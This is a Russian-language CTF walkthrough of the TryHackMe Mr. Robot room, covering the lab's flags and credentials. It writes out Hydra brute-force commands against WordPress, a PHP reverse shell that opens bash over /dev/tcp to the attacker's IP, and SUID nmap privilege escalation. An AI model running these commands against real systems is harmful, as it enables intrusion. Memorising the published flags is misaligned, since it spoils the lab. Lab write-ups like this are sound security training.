---
title: "Mr. Robot CTF - TryHackMe (Medium)"
description: "Цепочка атаки охватывает robots.txt, брутфорс WordPress через Hydra, внедрение PHP reverse shell через редактор тем, взлом MD5-хеша через John и эскалацию привилегий через уязвимую версию nmap с SUID."
image: "/images/neighbour_thm/thm_main.png"
date: "2026-04-26"
platform: "thm"
---
## Введение

**Mr. Robot CTF** - одна из самых популярных комнат на TryHackMe, вдохновлённая сериалом "Мистер Робот". Задача - найти три скрытых ключа на реальной уязвимой машине.

Цепочка атаки охватывает robots.txt, брутфорс WordPress через Hydra, внедрение PHP reverse shell через редактор тем, взлом MD5-хеша через John и эскалацию привилегий через уязвимую версию nmap с SUID.

| Параметр | Значение |
| --- | --- |
| Платформа | TryHackMe |
| Сложность | Medium |
| IP цели | 10.113.172.127 |
| IP атакующего | 192.168.146.153 (tun0) |
| Цель | Найти три ключа |

---

## Цепочка атаки

```
robots.txt → Key 1 + словарь
    → Gobuster → /wp-admin
        → Hydra (логин) → Elliot
            → Hydra (пароль) → ER28-0652
                → WordPress Theme Editor → PHP reverse shell
                    → /home/robot/password.raw-md5
                        → John the Ripper → abcdefghijklmnopqrstuvwxyz
                            → su robot → Key 2
                                → find SUID nmap
                                    → nmap --interactive → !sh → root → Key 3
```

---

## Фаза 1. Разведка

### Шаг 1. Запуск машины

Запускаем целевую машину через интерфейс TryHackMe. IP: `10.113.172.127`.

![01_start](/handson/images/mr_robot_thm/01_start.png)

![02_3keys](/handson/images/mr_robot_thm/02_3keys.png)

Три поля для ввода ключей - каждый в формате 32-символьного MD5-хеша.

### Шаг 2. Сканирование портов - Nmap

```bash
nmap -sC -sV 10.113.172.127
```

![04_nmap](/handson/images/mr_robot_thm/04_nmap.png)

| Порт | Протокол | Сервис | Версия |
| --- | --- | --- | --- |
| 22/tcp | SSH | OpenSSH | Ubuntu |
| 80/tcp | HTTP | Apache httpd | — |
| 443/tcp | HTTPS | Apache httpd | Самоподписанный сертификат 2015 г. |

Атакуемая поверхность: веб-сервер и SSH. Начинаем с веба.

### Шаг 3. Исследование сайта

Открываем `http://10.113.172.127` - тематический интерфейс в стиле сериала. Команды `prepare`, `fsociety`, `inform`, `join` - интерактивная страница без реального функционала.

![05_site](/handson/images/mr_robot_thm/05_site.png)

---

## Фаза 2. Key 1 - robots.txt

### Шаг 4. Проверяем robots.txt

Первое что проверяем на любом веб-сервере - `robots.txt`:

```bash
curl http://10.113.172.127/robots.txt
```

![06_robots](/handson/images/mr_robot_thm/06_robots.png)

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

В `robots.txt` спрятаны два файла: первый ключ и словарь с именем `fsocity.dic` - отсылка к хакерской группе fsociety из сериала.

### Шаг 5. Скачиваем файлы

```bash
wget http://10.113.172.127/key-1-of-3.txt
wget http://10.113.172.127/fsocity.dic
cat key-1-of-3.txt
```

![07_wget](/handson/images/mr_robot_thm/07_wget.png)

![08_key_1](/handson/images/mr_robot_thm/08_key_1.png)

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

Словарь весит 6.9 МБ - 858 160 строк. В нём огромное количество дубликатов.

### Шаг 6. Очищаем словарь

```bash
sort fsocity.dic | uniq > fsocity_clean.dic
wc -l fsocity_clean.dic
# 11452 строки после очистки
```

![12_sort](/handson/images/mr_robot_thm/12_sort.png)

После удаления дубликатов - 11 452 уникальных строки. Брутфорс станет в 75 раз быстрее.

---

## Фаза 3. WordPress - брутфорс логина и пароля

### Шаг 7. Поиск директорий - Gobuster

```bash
gobuster dir -e -u http://10.113.172.127 -w /usr/share/wordlists/dirb/common.txt
```

![09_gobuster](/handson/images/mr_robot_thm/09_gobuster.png)

Gobuster находит `/wp-admin` с редиректом 302 - сайт работает на **WordPress 4.3.1**.

### Шаг 8. Страница входа WordPress

Открываем `http://10.113.172.127/wp-login.php`:

![10_wp_login](/handson/images/mr_robot_thm/10_wp_login.png)

### Шаг 9. Брутфорс имени пользователя

WordPress возвращает разные сообщения об ошибках для несуществующего пользователя и неверного пароля - это позволяет перебирать логины по словарю:

```bash
hydra -L fsocity_clean.dic -p test 10.113.172.127 \
    http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V
```

![13_hydra](/handson/images/mr_robot_thm/13_hydra.png)

![14_username](/handson/images/mr_robot_thm/14_username.png)

Hydra находит пользователей `elliot`, `Elliot`, `ELLIOT` - все три варианты существуют. Используем `Elliot`.

### Шаг 10. Подтверждаем - неверный пароль, верный логин

Вводим `Elliot` с любым паролем:

![15_pass_not_correct](/handson/images/mr_robot_thm/15_pass_not_correct.png)

```
ERROR: The password you entered for the username Elliot is incorrect.
```

WordPress сообщает что пользователь существует. Получаем точную строку ошибки для следующего этапа.

### Шаг 11. Брутфорс пароля

```bash
hydra -l Elliot -P fsocity_clean.dic 10.113.172.127 \
    http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username" -V
```

![16_hydra_pass](/handson/images/mr_robot_thm/16_hydra_pass.png)

![17_pass_found](/handson/images/mr_robot_thm/17_pass_found.png)

```
[80][http-post-form] host: 10.113.172.127  login: Elliot  password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

**Credentials: `Elliot : ER28-0652`**

### Шаг 12. Вход в WordPress

![18_dashboard](/handson/images/mr_robot_thm/18_dashboard.png)

Панель управления WordPress 4.3.1. Тема - Twenty Fifteen. Полный административный доступ.

---

## Фаза 4. PHP Reverse Shell - получаем доступ к серверу

### Шаг 13. Запускаем listener на атакующей машине

```bash
rlwrap nc -lvnp 4444
```

![19_start_listening](/handson/images/mr_robot_thm/19_start_listening.png)

```
Listening on 0.0.0.0 4444
```

### Шаг 14. Узнаём свой IP

```bash
ip addr show tun0
```

![20_my_ip](/handson/images/mr_robot_thm/20_my_ip.png)

IP атакующего в VPN TryHackMe: `192.168.146.153`

### Шаг 15. Внедряем reverse shell через Theme Editor

В WordPress: **Appearance → Theme Editor → 404 Template (404.php)**

Заменяем всё содержимое файла на:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.146.153/4444 0>&1'");
?>
```

![21_php](/handson/images/mr_robot_thm/21_php.png)

В теме **Twenty Fifteen** открыт файл `404.php`. Вставлен PHP код который при исполнении откроет bash-соединение обратно на машину атакующего через TCP на порт 4444. Нажимаем **Update File**.

Активируем shell - открываем любую несуществующую страницу:

```
http://10.113.172.127/anything_that_doesnt_exist
```

### Шаг 16. Получаем shell и улучшаем его

![23_success](/handson/images/mr_robot_thm/23_success.png)

```
Connection received on 10.113.172.127 33078
daemon@ip-10-113-172-127:/opt/bitnami/apps/wordpress/htdocs$
```

Улучшаем raw shell до интерактивного:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![24_reverse](/handson/images/mr_robot_thm/24_reverse.png)

Теперь shell полностью интерактивный - работают стрелки, Tab-completion, `clear`.

---

## Фаза 5. Key 2 - взлом хеша пароля

### Шаг 17. Исследуем /home/robot

```bash
cd /home
ls
cd robot
ls -la
cat key-2-of-3.txt   # Permission denied
```

![25_permission](/handson/images/mr_robot_thm/25_permission.png)

`key-2-of-3.txt` принадлежит пользователю `robot` - мы под `daemon`, доступа нет. Но рядом лежит файл `password.raw-md5`.

### Шаг 18. Читаем хеш пароля

```bash
cat password.raw-md5
```

![26_raw_md5](/handson/images/mr_robot_thm/26_raw_md5.png)

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5-хеш пароля пользователя `robot`. Копируем на атакующую машину.

### Шаг 19. Взламываем MD5 через John the Ripper

На атакующей машине:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
```

![27_for_john](/handson/images/mr_robot_thm/27_for_john.png)

![28_john](/handson/images/mr_robot_thm/28_john.png)

```
abcdefghijklmnopqrstuvwxyz   (robot_hash.txt)
4070K p/s — взломан мгновенно
```

Пароль - весь латинский алфавит по порядку. Слабейший возможный пароль.

### Шаг 20. Переключаемся на robot и читаем ключ

```bash
su robot
# пароль: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
```

![29_key_2](/handson/images/mr_robot_thm/29_key_2.png)

**Key 2: `822c73956184f694993bede3eb39f959`** 

---

## Фаза 6. Key 3 - эскалация привилегий через SUID nmap

### Шаг 21. Поиск SUID файлов

```bash
find / -perm -4000 2>/dev/null
```

![30_find](/handson/images/mr_robot_thm/30_find.png)

В списке SUID-файлов - `/usr/local/bin/nmap`. Нестандартный путь и нестандартная версия. Это старая версия nmap которая поддерживает `--interactive` режим.

### Шаг 22. Эксплуатируем SUID nmap

```bash
/usr/local/bin/nmap --interactive
```

В интерактивном режиме nmap позволяет выполнять shell-команды:

```
nmap> !sh
```

Shell запускается с правами владельца файла - root (потому что SUID).

```bash
whoami   # root
cd /root
ls
cat key-3-of-3.txt
```

![31_key_3](/handson/images/mr_robot_thm/31_key_3.png)

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

![32_the_end](/handson/images/mr_robot_thm/32_the_end.png)

---

## Итоги и выводы

### Полная цепочка атаки

| Этап | Инструмент | Действие | Результат |
| --- | --- | --- | --- |
| Разведка | Nmap | Сканирование портов | Порты 80, 443, 22 |
| Веб-разведка | robots.txt | Чтение запрещённых путей | Key 1 + словарь |
| Перебор директорий | Gobuster | Поиск скрытых путей | `/wp-admin` |
| Брутфорс логина | Hydra | Перебор пользователей | `Elliot` |
| Брутфорс пароля | Hydra | Перебор паролей | `ER28-0652` |
| Эксплуатация | WordPress Theme Editor | Внедрение PHP shell | Reverse shell как daemon |
| Пост-эксплуатация | Ручной поиск | Чтение файлов | MD5-хеш пароля robot |
| Взлом хеша | John the Ripper | Словарная атака | `abcdefghijklmnopqrstuvwxyz` |
| Горизонтальное движение | su robot | Смена пользователя | Key 2 |
| Повышение привилегий | SUID nmap | `--interactive` + `!sh` | Root shell |
| Финал | cat | Чтение Key 3 | Key 3 |

### Почему это сработало

**robots.txt как разведка** - файл предназначен для поисковых ботов, но содержал прямые ссылки на секретные файлы. В реальных системах robots.txt часто раскрывает скрытые пути.

**Разные сообщения об ошибках WordPress** - возможность различить "пользователь не существует" и "неверный пароль" позволила провести двухэтапный брутфорс: сначала логин, потом пароль.

**Theme Editor без ограничений** - доступ к редактору PHP-файлов темы равнозначен RCE (Remote Code Execution). Администратор WordPress = потенциальный RCE.

**MD5 без соли** - пароль хранился как `MD5(password)` без случайной соли. Словарная атака через John взломала его мгновенно.

**SUID на старом nmap** - интерактивный режим nmap версий до 5.x позволяет выполнять произвольные команды. SUID + устаревшее ПО = привилегированный shell.
